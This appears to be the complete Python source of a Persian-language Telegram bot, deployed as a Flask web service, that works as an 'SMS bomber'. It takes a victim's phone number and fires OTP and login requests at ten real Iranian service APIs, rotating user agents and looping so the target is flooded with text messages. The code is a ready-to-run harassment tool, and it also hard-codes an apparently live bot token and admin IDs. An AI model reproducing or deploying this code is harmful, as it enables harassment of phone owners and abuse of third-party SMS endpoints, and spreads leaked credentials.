# -*- coding: utf-8 -*-
"""
🤖 ربات SMS Bomber - Web Service
"""

import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton, ReplyKeyboardMarkup, KeyboardButton
import requests
import json
import time
import random
import threading
import sqlite3
import hashlib
from datetime import datetime, date
from flask import Flask, request
import os
import sys

# ==================== تنظیمات اصلی ====================

BOT_TOKEN = "8569730818:AAH_iPHg2IbZLtyKsRMHa_q3aE1UA1F2c7I"
ADMIN_IDS = [7620484201, 8226091292]
REQUIRED_CHANNEL = "@death_star_sms_bomber"
CHANNEL_LINK = "https://t.me/death_star_sms_bomber"
DAILY_LIMIT = 5

# شماره محافظت شده - هش شده
PROTECTED_PHONE_HASHES = [
    "a7c3f8b2e9d4c1a5b6f8e3d2c7a9b4e1f5d8c3a2b7e6f9d4c1a8b3e5f7c2a9d4",  
]

# ==================== مقداردهی اولیه ====================

app = Flask(__name__)
bot = telebot.TeleBot(BOT_TOKEN)
user_processes = {}

# ==================== دیتابیس درون‌حافظه‌ای ====================

class MemoryDatabase:
    def __init__(self):
        self.conn = sqlite3.connect(':memory:')
        self.c = self.conn.cursor()
        self.create_tables()
        self.add_protected_numbers()
    
    def create_tables(self):
        self.c.execute('''CREATE TABLE users
                         (user_id INTEGER PRIMARY KEY,
                          username TEXT,
                          first_name TEXT,
                          join_date TEXT,
                          last_use TEXT,
                          daily_count INTEGER DEFAULT 0,
                          total_count INTEGER DEFAULT 0,
                          is_banned INTEGER DEFAULT 0)''')
        
        self.c.execute('''CREATE TABLE blocked_phones
                         (phone_hash TEXT PRIMARY KEY,
                          date TEXT)''')
        
        self.c.execute('''CREATE TABLE daily_stats
                         (date TEXT PRIMARY KEY,
                          total_requests INTEGER DEFAULT 0)''')
        
        self.conn.commit()
    
    def add_protected_numbers(self):
        today = datetime.now().strftime('%Y-%m-%d')
        for h in PROTECTED_PHONE_HASHES:
            self.c.execute("INSERT OR IGNORE INTO blocked_phones VALUES (?, ?)", (h, today))
        self.conn.commit()
    
    def is_phone_protected(self, phone):
        h = hashlib.sha256(phone.encode()).hexdigest()
        self.c.execute("SELECT * FROM blocked_phones WHERE phone_hash = ?", (h,))
        return self.c.fetchone() is not None
    
    def get_daily_count(self, user_id):
        today = date.today().isoformat()
        self.c.execute('''SELECT daily_count FROM users 
                         WHERE user_id = ? AND last_use = ?''', (user_id, today))
        result = self.c.fetchone()
        return result[0] if result else 0
    
    def update_user_count(self, user_id, username, first_name):
        today = date.today().isoformat()
        
        self.c.execute("SELECT * FROM users WHERE user_id = ?", (user_id,))
        user = self.c.fetchone()
        
        if user:
            if user[4] == today:
                self.c.execute('''UPDATE users 
                                 SET daily_count = daily_count + 1,
                                     total_count = total_count + 1
                                 WHERE user_id = ?''', (user_id,))
            else:
                self.c.execute('''UPDATE users 
                                 SET last_use = ?,
                                     daily_count = 1,
                                     total_count = total_count + 1
                                 WHERE user_id = ?''', (today, user_id))
        else:
            self.c.execute('''INSERT INTO users 
                             (user_id, username, first_name, join_date, last_use, daily_count, total_count)
                             VALUES (?, ?, ?, ?, ?, 1, 1)''',
                          (user_id, username, first_name, today, today))
        
        self.c.execute('''INSERT OR REPLACE INTO daily_stats (date, total_requests)
                         VALUES (?, COALESCE((SELECT total_requests + 1 FROM daily_stats WHERE date = ?), 1))''',
                      (today, today))
        
        self.conn.commit()
    
    def get_stats(self):
        self.c.execute("SELECT COUNT(*) FROM users")
        total_users = self.c.fetchone()[0]
        
        self.c.execute("SELECT COUNT(*) FROM users WHERE last_use = ?", (date.today().isoformat(),))
        today_users = self.c.fetchone()[0]
        
        self.c.execute("SELECT SUM(total_requests) FROM daily_stats")
        total_requests = self.c.fetchone()[0] or 0
        
        self.c.execute("SELECT date, total_requests FROM daily_stats ORDER BY date DESC LIMIT 7")
        weekly = self.c.fetchall()
        
        return total_users, today_users, total_requests, weekly
    
    def get_user_total(self, user_id):
        self.c.execute("SELECT total_count, join_date FROM users WHERE user_id = ?", (user_id,))
        return self.c.fetchone()

# ایجاد دیتابیس
db = MemoryDatabase()

# ==================== توابع کمکی ====================

def hash_phone(phone):
    return hashlib.sha256(phone.encode()).hexdigest()

def is_phone_protected(phone):
    return db.is_phone_protected(phone)

def mask_phone(phone):
    return phone[:4] + "****" + phone[-4:]

def is_admin(user_id):
    return user_id in ADMIN_IDS

def check_membership(user_id):
    try:
        member = bot.get_chat_member(REQUIRED_CHANNEL, user_id)
        return member.status in ['member', 'administrator', 'creator']
    except:
        return False

def membership_required(func):
    def wrapper(message):
        user_id = message.from_user.id
        if is_admin(user_id) or check_membership(user_id):
            return func(message)
        else:
            markup = InlineKeyboardMarkup()
            markup.add(InlineKeyboardButton("📢 عضویت در کانال", url=CHANNEL_LINK))
            markup.add(InlineKeyboardButton("✅ بررسی عضویت", callback_data="check_join"))
            bot.reply_to(message, f"⚠️ باید در کانال {REQUIRED_CHANNEL} عضو شوید!", reply_markup=markup)
    return wrapper

def get_daily_count(user_id):
    return db.get_daily_count(user_id)

def check_daily_limit(user_id):
    if is_admin(user_id):
        return True, 0
    daily = get_daily_count(user_id)
    return daily < DAILY_LIMIT, daily

def update_user_count(user_id, username, first_name):
    db.update_user_count(user_id, username, first_name)

# ==================== توابع API ====================

def get_random_ua():
    agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148",
        "Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 Chrome/112.0.0.0 Mobile Safari/537.36",
    ]
    return random.choice(agents)

def send_request(url, data, headers=None, method="POST"):
    try:
        h = {
            "User-Agent": get_random_ua(),
            "Accept": "application/json",
        }
        if headers:
            h.update(headers)
        
        timeout = 5
        
        if method == "GET":
            r = requests.get(url, params=data, headers=h, timeout=timeout)
        else:
            if "multipart" in str(h.get("Content-Type", "")).lower():
                files = {k: (None, str(v)) for k, v in data.items() if v}
                r = requests.post(url, files=files, headers=h, timeout=timeout)
            else:
                h["Content-Type"] = "application/json"
                r = requests.post(url, json=data, headers=h, timeout=timeout)
        
        return r.status_code in [200, 201, 202, 204], r.status_code
    except Exception as e:
        return False, str(e)[:20]

# ==================== لیست APIها ====================

def get_all_apis(phone):
    """10 API اصلی"""
    return [
        {"name": "دیوار", "url": "https://api.divar.ir/v5/auth/authenticate", "data": {"phone": phone}},
        {"name": "شیپور", "url": "https://www.sheypoor.com/api/v10.0.0/auth/send", "data": {"username": phone}},
        {"name": "دیجی‌کالا", "url": "https://api.digikala.com/v1/user/authenticate/", "data": {"username": phone}},
        {"name": "اسنپ", "url": "https://app.snapp.taxi/api/api-passenger-oauth/v2/otp", "data": {"cellphone": f"+98{phone[1:]}"}},
        {"name": "تپسی", "url": "https://api.tapsi.ir/api/v2.2/user", "data": {"credential": {"phoneNumber": phone}}},
        {"name": "علی‌بابا", "url": "https://ws.alibaba.ir/api/v3/account/mobile/otp", "data": {"phoneNumber": phone}},
        {"name": "ترب", "url": "https://api.torob.com/a/phone/send-pin/", "method": "GET", "data": {"phone_number": phone}},
        {"name": "اسنپ‌فود", "url": "https://snappfood.ir/mobile/v2/user/loginMobileWithNoPass", "data": {"cellphone": phone}},
        {"name": "بله", "url": "https://core.gap.im/v1/user/add.json", "method": "GET", "data": {"mobile": f"+98{phone[1:]}"}},
        {"name": "ویترین", "url": "https://www.vitrin.shop/api/v1/user/request_code", "data": {"phone_number": phone}},
    ]

# ==================== Webhook برای تلگرام ====================

@app.route('/webhook', methods=['POST'])
def webhook():
    """دریافت آپدیت از تلگرام"""
    try:
        json_str = request.get_data().decode('UTF-8')
        update = telebot.types.Update.de_json(json_str)
        bot.process_new_updates([update])
        return 'OK', 200
    except Exception as e:
        print(f"خطا در webhook: {e}")
        return 'Error', 500

@app.route('/')
def home():
    """صفحه اصلی"""
    return "🤖 ربات SMS Bomber فعال است"

@app.route('/health')
def health():
    """بررسی سلامت"""
    return "OK", 200

# ==================== تنظیم Webhook ====================

def set_webhook():
    """تنظیم webhook برای بات"""
    try:
        # دریافت آدرس سرویس
        hostname = os.environ.get('RENDER_EXTERNAL_HOSTNAME')
        if not hostname:
            print("⚠️ RENDER_EXTERNAL_HOSTNAME یافت نشد")
            return
        
        webhook_url = f"https://{hostname}/webhook"
        bot.remove_webhook()
        time.sleep(1)
        bot.set_webhook(url=webhook_url)
        print(f"✅ Webhook تنظیم شد: {webhook_url}")
    except Exception as e:
        print(f"❌ خطا در تنظیم webhook: {e}")

# ==================== هندلرهای بات ====================

@bot.message_handler(commands=['start'])
def start(message):
    user_id = message.from_user.id
    
    markup = ReplyKeyboardMarkup(resize_keyboard=True)
    markup.add(KeyboardButton("🚀 شروع بمباران"))
    markup.add(KeyboardButton("📊 راهنما"), KeyboardButton("📊 آمار من"))
    
    if is_admin(user_id):
        markup.add(KeyboardButton("👑 پنل مدیریت"))
    
    welcome = (
        "🤖 به ربات SMS Bomber خوش آمدید!\n\n"
        f"📌 روزانه {DAILY_LIMIT} بار می‌توانید استفاده کنید\n"
        f"📢 کانال: {REQUIRED_CHANNEL}"
    )
    
    bot.send_message(message.chat.id, welcome, reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data == "check_join")
def check_join_callback(call):
    if check_membership(call.from_user.id):
        bot.answer_callback_query(call.id, "✅ عضویت تایید شد!")
        bot.delete_message(call.message.chat.id, call.message.message_id)
    else:
        bot.answer_callback_query(call.id, "❌ عضو نیستید!", show_alert=True)

@bot.message_handler(func=lambda m: m.text == "🚀 شروع بمباران")
@membership_required
def ask_phone(message):
    user_id = message.from_user.id
    
    can_use, daily = check_daily_limit(user_id)
    if not can_use:
        bot.send_message(message.chat.id, f"❌ امروز {daily} بار استفاده کردید. فردا تلاش کنید.")
        return
    
    if user_processes.get(message.chat.id):
        bot.send_message(message.chat.id, "❌ یک فرآیند در حال اجراست")
        return
    
    msg = bot.send_message(message.chat.id, "📱 شماره را وارد کنید (مثال: 09123456789):")
    bot.register_next_step_handler(msg, process_phone)

def process_phone(message):
    chat_id = message.chat.id
    user_id = message.from_user.id
    phone = message.text.strip()
    
    if not phone.startswith('09') or len(phone) != 11 or not phone.isdigit():
        bot.send_message(chat_id, "❌ شماره نامعتبر")
        return
    
    if is_phone_protected(phone):
        bot.send_message(chat_id, "❌ این شماره مسدود است")
        return
    
    update_user_count(user_id, message.from_user.username or "", message.from_user.first_name or "")
    
    user_processes[chat_id] = True
    msg = bot.send_message(chat_id, f"🔰 شروع برای {mask_phone(phone)}...")
    
    thread = threading.Thread(target=bombing_process, args=(chat_id, phone, msg.message_id))
    thread.daemon = True
    thread.start()

def bombing_process(chat_id, phone, msg_id):
    apis = get_all_apis(phone)
    total = len(apis)
    success = 0
    fail = 0
    
    for i, api in enumerate(apis, 1):
        if not user_processes.get(chat_id):
            break
        
        ok, _ = send_request(api['url'], api['data'], api.get('headers'), api.get('method', 'POST'))
        
        if ok:
            success += 1
        else:
            fail += 1
        
        if i % 2 == 0 or i == total:
            try:
                bot.edit_message_text(
                    f"🔰 پیشرفت: {int(i/total*100)}%\n✅ {success}\n❌ {fail}",
                    chat_id, msg_id
                )
            except:
                pass
        
        time.sleep(random.uniform(0.2, 0.5))
    
    bot.edit_message_text(f"✅ پایان\n✅ {success}\n❌ {fail}", chat_id, msg_id)
    user_processes.pop(chat_id, None)

@bot.message_handler(func=lambda m: m.text == "📊 راهنما")
def help_message(message):
    bot.send_message(message.chat.id, 
        "📚 راهنما:\n1️⃣ شروع بمباران\n2️⃣ شماره\n3️⃣ صبر\n\n🔰 10 API")

@bot.message_handler(func=lambda m: m.text == "📊 آمار من")
def my_stats(message):
    user_id = message.from_user.id
    daily = get_daily_count(user_id)
    result = db.get_user_total(user_id)
    total = result[0] if result else 0
    join_date = result[1] if result else "نامشخص"
    
    bot.send_message(message.chat.id,
        f"📊 آمار شما:\n🆔 {user_id}\n📅 {join_date}\n📊 امروز {daily}/5\n🔰 کل {total}")

@bot.message_handler(func=lambda m: m.text == "👑 پنل مدیریت")
def admin_panel(message):
    if not is_admin(message.from_user.id):
        bot.send_message(message.chat.id, "⛔ دسترسی ندارید")
        return
    
    total_users, today_users, total_requests, weekly = db.get_stats()
    
    text = f"👑 پنل مدیریت\n👥 کل: {total_users}\n📅 امروز: {today_users}\n🔰 کل درخواست: {total_requests}"
    bot.send_message(message.chat.id, text)

@bot.message_handler(commands=['stop'])
def stop_process(message):
    if message.chat.id in user_processes:
        user_processes[message.chat.id] = False
        bot.send_message(message.chat.id, "⛔ متوقف شد")
    else:
        bot.send_message(message.chat.id, "⚠️ فرآیندی نیست")

# ==================== اجرا ====================

if __name__ == "__main__":
    print("="*50)
    print("🤖 ربات SMS Bomber - Web Service")
    print(f"📌 نام سرویس: ftyydftrye5r 6e5te")
    print("="*50)
    
    # تنظیم webhook
    set_webhook()
    
    # دریافت پورت از محیط
    port = int(os.environ.get('PORT', 10000))
    print(f"🚀 اجرا روی پورت {port}")
    
    # اجرای Flask
    app.run(host='0.0.0.0', port=port)
